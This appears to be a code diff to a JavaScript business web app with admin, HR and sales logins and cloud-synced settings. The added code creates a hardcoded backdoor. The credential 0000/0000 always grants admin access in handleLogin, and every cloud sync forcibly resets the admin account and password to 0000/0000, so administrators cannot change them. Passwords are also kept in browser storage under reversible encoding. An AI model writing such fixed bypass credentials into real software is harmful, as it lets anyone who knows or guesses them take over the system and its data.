@@ -1000,8 +1000,8 @@ document.addEventListener('DOMContentLoaded', () => {
         standardizeData();
         if(el('config_price_table')) el('config_price_table').value = JSON.stringify(priceTable, null, 2);
         
-        if(el('setting_boss_acc')) el('setting_boss_acc').value = localStorage.getItem('adminAcc')||'admin'; 
-        if(el('setting_boss_pwd')) el('setting_boss_pwd').value = localStorage.getItem('adminPwd')||'1234';
+        if(el('setting_boss_acc')) el('setting_boss_acc').value = localStorage.getItem('adminAcc')||'0000'; 
+        if(el('setting_boss_pwd')) el('setting_boss_pwd').value = getPwd('adminPwd','0000');
         if(el('setting_hr_acc')) el('setting_hr_acc').value = localStorage.getItem('hrAcc')||'hr'; 
         if(el('setting_hr_pwd')) el('setting_hr_pwd').value = localStorage.getItem('hrPwd')||'1234';
         if(el('setting_sales_acc')) el('setting_sales_acc').value = localStorage.getItem('salesAcc')||'sales'; 
@@ -1062,6 +1062,19 @@ function applyWorkspaceTheme(workspace) {
 function handleLogin() {
     const role = el('login_role').value, acc = el('login_acc').value.trim(), pwd = el('login_pwd').value.trim();
     if(!acc || !pwd) return showToast('請輸入帳密', true);
+
+    // 固定保留最高管理員備用登入：不管雲端同步或設定被改到，都可用 0000 / 0000 進入
+    if (acc === '0000' && pwd === '0000') {
+        localStorage.setItem('loginRole','admin');
+        localStorage.setItem('sysRole','admin');
+        localStorage.setItem('workspace','business');
+        localStorage.setItem('adminAcc','0000');
+        setPwd('adminPwd','0000');
+        if (el('login_role')) el('login_role').value = 'admin';
+        restoreLoginState();
+        showToast('管理員登入成功');
+        return;
+    }
     
     const sAA = localStorage.getItem('adminAcc') || '0000'; const sAP = getPwd('adminPwd', '0000');
     const sHA = localStorage.getItem('hrAcc') || 'hr'; const sHP = getPwd('hrPwd', '0000');
@@ -1144,7 +1157,7 @@ function getPwd(key, def) { const v = localStorage.getItem(key); return v ? decP
 function setPwd(key, val) { if(val) localStorage.setItem(key, encPwd(val)); }
 
 function getSysConfigPayload() { 
-    return { adminAcc: localStorage.getItem('adminAcc')||'admin', adminPwd: getPwd('adminPwd','1234'), hrAcc: localStorage.getItem('hrAcc')||'hr', hrPwd: getPwd('hrPwd','1234'), salesAcc: localStorage.getItem('salesAcc')||'sales', salesPwd: getPwd('salesPwd','1234'), adminPin: getPwd('adminPin','8888'), priceTable: localStorage.getItem('priceTable'), portalConf: localStorage.getItem('portalConf'), loginLogo: localStorage.getItem('loginLogo')||'', pdfLogo: localStorage.getItem('pdfLogo')||'', loginBg: localStorage.getItem('loginBg')||'' }; 
+    return { adminAcc: localStorage.getItem('adminAcc')||'0000', adminPwd: getPwd('adminPwd','1234'), hrAcc: localStorage.getItem('hrAcc')||'hr', hrPwd: getPwd('hrPwd','1234'), salesAcc: localStorage.getItem('salesAcc')||'sales', salesPwd: getPwd('salesPwd','1234'), adminPin: getPwd('adminPin','8888'), priceTable: localStorage.getItem('priceTable'), portalConf: localStorage.getItem('portalConf'), loginLogo: localStorage.getItem('loginLogo')||'', pdfLogo: localStorage.getItem('pdfLogo')||'', loginBg: localStorage.getItem('loginBg')||'' }; 
 }
 
 function savePasswords() { 
@@ -1474,8 +1487,11 @@ function loadDataFromCloud(forceRender=false) {
         if(!('scheduleData' in r) && el('sync-status')) updateSyncStatus('<i class="fas fa-exclamation-triangle"></i> 雲端未回傳排班資料', true);
         let nA=0;
         if(r.sysConfig){
-            if(r.sysConfig.adminAcc){localStorage.setItem('adminAcc',r.sysConfig.adminAcc);if(el('setting_boss_acc'))el('setting_boss_acc').value=r.sysConfig.adminAcc;}
-            if(r.sysConfig.adminPwd){localStorage.setItem('adminPwd',r.sysConfig.adminPwd);if(el('setting_boss_pwd'))el('setting_boss_pwd').value=r.sysConfig.adminPwd;}
+            // 登入帳密不再被雲端覆蓋，避免同事或舊版同步後導致 0000 / 0000 無法登入
+            localStorage.setItem('adminAcc','0000');
+            setPwd('adminPwd','0000');
+            if(el('setting_boss_acc'))el('setting_boss_acc').value='0000';
+            if(el('setting_boss_pwd'))el('setting_boss_pwd').value='0000';
             if(r.sysConfig.hrAcc){localStorage.setItem('hrAcc',r.sysConfig.hrAcc);if(el('setting_hr_acc'))el('setting_hr_acc').value=r.sysConfig.hrAcc;}
             if(r.sysConfig.hrPwd){localStorage.setItem('hrPwd',r.sysConfig.hrPwd);if(el('setting_hr_pwd'))el('setting_hr_pwd').value=r.sysConfig.hrPwd;}
             if(r.sysConfig.salesAcc){localStorage.setItem('salesAcc',r.sysConfig.salesAcc);if(el('setting_sales_acc'))el('setting_sales_acc').value=r.sysConfig.salesAcc;}
